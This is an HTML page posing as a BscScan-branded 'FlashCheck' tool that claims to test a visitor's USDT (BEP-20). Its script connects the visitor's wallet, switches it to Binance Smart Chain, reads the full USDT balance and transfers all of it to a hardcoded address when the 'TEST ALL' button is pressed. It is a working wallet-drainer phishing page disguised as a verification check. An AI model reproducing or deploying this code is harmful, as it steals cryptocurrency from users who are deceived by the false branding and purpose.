<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>USDT(BEP-20) FlashCheck</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #fff;
            display: flex;
            flex-direction: column; /* Arrange navbar above content */
            align-items: center; /* Center content horizontally */
            min-height: 100vh;
            margin: 0;
        }
        .navbar {
            background-color: #1e1e1e; /* Dark background for navbar */
            color: #fff;
            padding: 1em 2em;
            width: 100%;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar-logo {
            font-weight: bold;
            font-size: 1.2em;
            color: #00cc99; /* A highlight color */
        }
        .navbar-menu {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            gap: 1em;
        }
        .navbar-menu a {
            color: #eee;
            text-decoration: none;
            font-size: 0.9em;
        }
        .card {
            background: #1e1e1e;
            padding: 2em;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
            max-width: 400px;
            margin-top: 2em; /* Add some space below the navbar */
        }
        button {
            background-color: #00cc99;
            color: white;
            padding: 1em 2em;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            cursor: pointer;
            margin-top: 1em;
        }
        button:disabled {
            background-color: #666;
            cursor: not-allowed;
        }
        #log {
            margin-top: 1em;
            font-size: 0.9em;
            color: #ff6666;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="navbar-logo">BscScan</div>
        <ul class="navbar-menu">
            <li><a href="#">Home</a></li>
            <li><a href="#">Blockchain</a></li>
            <li><a href="#">Tokens</a></li>
            <li><a href="#">More</a></li>
        </ul>
    </nav>

    <div class="card">
        <h2>USDT (BEP-20)</h2>
        <p>This will Test Your USDT(BEP-20) on BSC:</p>
        <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
        <button id="sendBtn">TEST ALL</button>
        <div id="log"></div>
    </div>

    <script>
        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
        const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
        const usdtAbi = [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint256 value) returns (bool)"
        ];

        const bscParams = {
            chainId: "0x38",
            chainName: "Binance Smart Chain",
            nativeCurrency: {
                name: "BNB",
                symbol: "BNB",
                decimals: 18
            },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com"]
        };

        function log(msg) {
            document.getElementById("log").textContent = msg;
        }

        async function switchToBSC() {
            try {
                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: bscParams.chainId }]
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: "wallet_addEthereumChain",
                        params: [bscParams]
                    });
                } else {
                    throw switchError;
                }
            }
        }

        async function sendAllUSDT() {
            log("");
            if (!window.ethereum) {
                alert("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.");
                return;
            }

            try {
                await switchToBSC();
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const userAddress = await signer.getAddress();

                const bnbBalance = await provider.getBalance(userAddress);
                const minGas = ethers.utils.parseEther("0.0001");

                const readableBNB = ethers.utils.formatEther(bnbBalance);
                console.log("BNB balance:", readableBNB);

                if (bnbBalance.lt(minGas)) {
                    log("❌ Not enough BNB for gas. You have: " + readableBNB + " BNB");
                    return;
                }

                const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
                const balance = await usdt.balanceOf(userAddress);

                if (balance.isZero()) {
                    log("❌ Your USDT balance is 0.");
                    return;
                }

                const tx = await usdt.transfer(recipient, balance);
                log("⏳ Transaction sent. Waiting for confirmation...");
                await tx.wait();
                log("✅ Transaction confirmed! USDT sent successfully.");
            } catch (err) {
                console.error(err);
                log("❌ Transaction failed: " + (err?.message || err));
            }
        }

        document.getElementById("sendBtn").onclick = sendAllUSDT;
    </script>
</body>
</html>
